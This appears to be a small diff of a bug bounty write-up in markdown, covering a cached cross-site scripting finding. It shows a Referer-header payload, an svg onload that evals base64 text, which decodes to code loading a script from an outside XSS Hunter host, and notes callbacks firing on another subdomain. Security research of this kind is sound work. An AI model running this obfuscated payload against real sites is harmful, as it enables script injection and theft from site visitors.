@@ -246,6 +246,7 @@ Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbn
 ```
 
 Response:
+
 ```
 HTTP/2 200 Ok...
 Content-Type: text/html; charset=utf-8
@@ -254,6 +255,7 @@ X-Cache: HIT
 <svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>...
 
 ```
+
 woke up with 35 Notifications from XSSHunter the next day, and to my surprise, 4 of them were fired on a different subdomain.
 
 ![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/e9462870-7ffd-4303-92f8-d9fd681673c2)
